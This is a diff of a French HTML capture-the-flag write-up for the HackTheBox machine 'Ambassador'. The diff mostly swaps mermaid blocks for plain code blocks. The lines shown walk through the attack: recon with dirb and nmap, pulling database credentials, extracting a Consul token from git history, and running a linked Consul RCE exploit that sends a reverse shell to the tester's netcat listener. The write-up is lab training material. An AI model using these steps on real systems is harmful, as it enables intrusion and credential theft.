@@ -178,12 +178,10 @@
 <h1 id="note">Note</h1>
 <p>La room était assez sympa, plutôt entre medium et easy. C&rsquo;est dommage qu&rsquo;il n&rsquo;y ait &ldquo;que&rdquo; des CVE même si l&rsquo;exploitation de Consul est intéressante.</p>
 <h1 id="recon">Recon</h1>
-<pre class="mermaid">dirb http://10.10.11.183
-</pre>
-<p><img src="https://i.ibb.co/rtQ943K/2022-12-05-151758-960x1078-scrot.png" alt="dirb results"></p>
-<pre class="mermaid">nmap -sC -sV 10.10.11.183
-</pre>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#bd93f9">3000</span><span style="color:#ff79c6">/</span>tcp open  ppp<span style="color:#ff79c6">?</span>
+<pre tabindex="0"><code>dirb http://10.10.11.183
+</code></pre><p><img src="https://i.ibb.co/rtQ943K/2022-12-05-151758-960x1078-scrot.png" alt="dirb results"></p>
+<pre tabindex="0"><code>nmap -sC -sV 10.10.11.183
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#bd93f9">3000</span><span style="color:#ff79c6">/</span>tcp open  ppp<span style="color:#ff79c6">?</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span> fingerprint<span style="color:#ff79c6">-</span>strings<span style="color:#ff79c6">:</span> 
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>   FourOhFourRequest<span style="color:#ff79c6">:</span> 
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">|</span>     HTTP<span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.0</span> <span style="color:#bd93f9">302</span> Found
@@ -223,9 +221,8 @@
 <p>On trouve assez rapidement un mot de passe dans la table <code>data_source</code></p>
 <p><img src="https://i.ibb.co/nfCtZyG/2022-12-05-145940-1143x618-scrot.png" alt="password.png"></p>
 <p>On se connecte à la database mysql avec comme user “grafana” et le mot de passe qu&rsquo;on vient de trouver</p>
-<pre class="mermaid">mysql -u grafana -p -h ambassador.htb
-</pre>
-<p>En listant les databases, une sort du lot: <code>whackywidget</code></p>
+<pre tabindex="0"><code>mysql -u grafana -p -h ambassador.htb
+</code></pre><p>En listant les databases, une sort du lot: <code>whackywidget</code></p>
 <p><img src="https://i.ibb.co/jwjtzch/2022-12-05-150214-964x1048-scrot.png" alt="2022-12-05-150214_964x1048_scrot.png"></p>
 <p>On peut donc switcher dessus et lister les tables qu&rsquo;elle contient via la commande <code>show TABLES;</code></p>
 <p>Il n’y en a qu’une seule: <code>users</code>. En lisant son contenu, on voit un mot de passe encodé en <code>base64</code></p>
@@ -257,17 +254,15 @@
 </span></span><span style="display:flex;"><span>drwxrwxr<span style="color:#ff79c6">-</span>x <span style="color:#bd93f9">8</span> root root <span style="color:#bd93f9">4096</span> Mar <span style="color:#bd93f9">14</span>  <span style="color:#bd93f9">2022</span> <span style="color:#ff79c6">/</span>opt<span style="color:#ff79c6">/</span>my<span style="color:#ff79c6">-</span>app<span style="color:#ff79c6">/.</span>git
 </span></span></code></pre></div><p>On voit qu&rsquo;il existe un répertoire <code>.git</code> dans <code>/opt/my-app</code></p>
 <p>On peut donc s&rsquo;y rendre puis faire un <code>git log</code> pour accéder à l&rsquo;historique des commits faits au repo. On affiche ensuite les changements faits au commit original</p>
-<pre class="mermaid">git show 33a53ef9a207976d5ceceddc41a199558843bf3c
-</pre>
-<p>Et on y trouve le <code>token consul</code> écrit en clair.</p>
+<pre tabindex="0"><code>git show 33a53ef9a207976d5ceceddc41a199558843bf3c
+</code></pre><p>Et on y trouve le <code>token consul</code> écrit en clair.</p>
 <p><img src="https://i.ibb.co/z4Vv44N/2022-12-05-151635-965x1055-scrot.png" alt="bb03b43b-1d81-d62b-24b5-39540ee469b5"></p>
 <p>On reprend donc <a href="https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API/blob/main/exploit.py">l&rsquo;exploit</a> de tout à l&rsquo;heure, que devrait fonctionner maintenant qu&rsquo;on a le <code>token consul</code></p>
 <blockquote>
 <p>Il est aussi possible de passer par metasploit puisqu&rsquo;il existe un exploit pour cette CVE, mais puisque <code>consul</code> est un service local (il n&rsquo;est accessible que localement) il faudrait forwarder le port avec <code>chisel</code>. C&rsquo;est faisable sur cette machine, mais j&rsquo;ai décidé ici de directement mettre l&rsquo;exploit sur la machine.</p></blockquote>
 <p>On lance notre listener <code>netcat</code>, puis on lance l&rsquo;exploit sur la machine via cette commande</p>
-<pre class="mermaid">python3 exploit.py 127.0.0.1 8500 10.10.14.53 1338 bb03b43b-1d81-d62b-24b5-39540ee469b5
-</pre>
-<blockquote>
+<pre tabindex="0"><code>python3 exploit.py 127.0.0.1 8500 10.10.14.53 1338 bb03b43b-1d81-d62b-24b5-39540ee469b5
+</code></pre><blockquote>
 <p>8500 = Port sur lequel se trouve le service <code>consul</code></p>
 <p>1338 = Port sur lequel écoute notre <code>netcat</code></p>
 <p>10.10.14.53 = L&rsquo;IP de notre <code>OpenVPN</code> (ou de votre machine)</p></blockquote>
@@ -333,30 +328,6 @@
 
 
 
-
-<script type="module">
-    import mermaid from "https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.esm.min.mjs";
-    const settings = localStorage.getItem("theme") === "dark" ?
-        {
-            startOnLoad: true,
-            theme: "dark",
-            darkMode: true,
-            themeVariables: {
-                tertiaryColor: "#dee3ed"
-            }
-        }
-        :
-        {
-            startOnLoad: true,
-            theme: "base",
-            darkMode: false,
-            themeVariables: {
-                tertiaryColor: "#dee3ed"
-            }
-        }
-    ;
-    mermaid.initialize(settings);
-</script>
 
     </body>
 </html>
